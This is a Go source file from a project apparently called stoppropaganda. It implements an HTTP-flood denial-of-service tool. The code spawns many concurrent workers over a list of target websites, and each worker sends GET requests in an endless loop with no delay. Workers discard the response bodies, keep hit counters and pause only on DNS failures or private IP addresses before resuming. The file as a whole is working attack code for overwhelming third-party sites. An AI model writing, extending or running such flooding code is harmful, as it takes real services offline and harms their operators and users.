package stoppropaganda

import (
	"log"
	"net"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/customresolver"
	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/resolvefix"
	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/targets"
	"github.com/valyala/fasthttp"
)

const VALIDATE_DNS_EVERY = 5 * time.Minute

type WebsiteStatus struct {
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	Downloaded   uint64 `json:"downloaded"`
	LastErrorMsg string `json:"last_error_msg"`
	Status       string `json:"status"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`
}

func (ws *WebsiteStatus) IncreaseCounters(downloaded int, responseCode int) {
	ws.Requests++
	ws.Downloaded += uint64(downloaded)
	switch {
	case responseCode < 200:
		ws.Counter_code100++
	case responseCode < 300:
		ws.Counter_code200++
	case responseCode < 400:
		ws.Counter_code300++
	case responseCode < 500:
		ws.Counter_code400++
	default:
		ws.Counter_code500++
	}
}

func (ws *WebsiteStatus) IncreaseCountersErr(errMsg string) {
	ws.Requests++
	ws.Errors++
	ws.LastErrorMsg = errMsg
}

type Website struct {
	// These do not need synchronization as these are read-only
	host string
	req  *fasthttp.Request

	// Store status (counters) about website
	statusMux sync.Mutex
	status    WebsiteStatus

	// Used to handle logic that defines whether website is paused or not.
	checksPauseMux sync.Mutex
	dnsLastChecked time.Time
	pausedUntil    time.Time
	pausedTimer    *time.Timer

	// optimizations
	helperIPBuf []net.IP
}

var httpClient *fasthttp.Client

var websites = map[string]*Website{}

func NewWebsite(websiteUrlStr string) (website *Website) {
	websiteURL, err := url.Parse(websiteUrlStr)
	if err != nil {
		panic(err)
	}

	newReq := fasthttp.AcquireRequest()
	newReq.SetRequestURI(websiteUrlStr)
	newReq.Header.SetMethod(fasthttp.MethodGet)
	newReq.Header.Set("Host", websiteURL.Host)
	newReq.Header.Set("User-Agent", *flagUserAgent)
	newReq.Header.Set("Accept", "*/*")

	website = &Website{
		host: websiteURL.Host,
		status: WebsiteStatus{
			Status: "Initializing",
		},
		dnsLastChecked: time.Now().Add(-VALIDATE_DNS_EVERY), // this forces validation on first run
		pausedUntil:    time.Now(),
		req:            newReq,
		helperIPBuf:    make([]net.IP, 128),
	}
	return
}

func startWebsites() {
	for websiteUrl := range targets.TargetWebsites {
		websites[websiteUrl] = NewWebsite(websiteUrl)
	}

	websitesArr := make([]*Website, 0, len(websites))
	for _, website := range websites {
		websitesArr = append(websitesArr, website)
	}

	// Spawn workers
	numWorkers := *flagWorkers
	perWebsite := float64(numWorkers) / float64(len(websitesArr))
	log.Printf("Spawning %d workers for %d websites = %.1f workers/website", numWorkers, len(websitesArr), perWebsite)
	for i := 0; i < numWorkers; i++ {
		idx := i % len(websitesArr)
		website := websitesArr[idx]
		go website.runWebsiteWorker()
	}
	if perWebsite < 1.0 {
		log.Printf("Warn: Some websites have 0 workers, websites choosen randomly")
	}

}

// checksPauseMux must be locked prior calling this func
func (ws *Website) setPaused(duration time.Duration, reason string) {
	ws.statusMux.Lock()
	ws.status.Status = "Paused: " + reason
	ws.statusMux.Unlock()
	ws.pausedUntil = time.Now().Add(duration)
	ws.pausedTimer = time.NewTimer(duration)
}

func (ws *Website) allowedToRun() bool {
	ws.checksPauseMux.Lock()
	defer ws.checksPauseMux.Unlock()

	// Do not run if paused
	if time.Now().Before(ws.pausedUntil) {
		return false
	}

	needsValidation := time.Since(ws.dnsLastChecked) >= VALIDATE_DNS_EVERY

	// If validation is not (yet) needed - run
	if !needsValidation {
		return true
	}

	// Validation is needed...
	ws.dnsLastChecked = time.Now()
	ipAddresses, err := customresolver.GetIPs(ws.host, ws.helperIPBuf)
	if err != nil {
		errStr := err.Error()
		switch {
		case strings.HasSuffix(errStr, "Temporary failure in name resolution") || strings.HasSuffix(errStr, "connection refused"):
			ws.setPaused(time.Second, "Your DNS servers unreachable or returned an error: "+errStr)
			return false
		case strings.HasSuffix(errStr, "no such host"):
			ws.setPaused(5*time.Minute, "Domain does not exist: "+errStr)
			return false
		case strings.HasSuffix(errStr, "No address associated with hostname"):
			ws.setPaused(5*time.Minute, "Domain does not have any IPs assigned: "+errStr)
			return false
		}
		ws.setPaused(10*time.Second, errStr)
		return false
	}

	if err = resolvefix.CheckNonPublicIP(ipAddresses); err != nil {
		ws.setPaused(5*time.Minute, err.Error())
		return false
	}
	return true
}

func (ws *Website) runWebsiteWorker() {
	// Each worker has it's own response
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	for {
		if !ws.allowedToRun() {
			// Wait for unpause
			<-ws.pausedTimer.C
			continue
		}
		ws.statusMux.Lock()
		ws.status.Status = "Running"
		ws.statusMux.Unlock()

		ws.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823

		resp.ShouldDiscardBody = true

		// Perform request
		err := httpClient.Do(req, resp)
		if err != nil {
			ws.statusMux.Lock()
			ws.status.IncreaseCountersErr("httpClient.Do: " + err.Error())
			ws.statusMux.Unlock()
			continue
		}

		downloaded := resp.LastDiscarded
		if !resp.ShouldDiscardBody {
			downloaded = len(resp.Body())
		}

		// Prevent site memory leaking us with 32+ MB (uno reverso)
		if len(resp.Body()) > 32*1024*1024 {
			resp.ResetBody()
		}

		// Increase counters
		ws.statusMux.Lock()
		ws.status.IncreaseCounters(downloaded, resp.StatusCode())
		ws.statusMux.Unlock()
	}
}
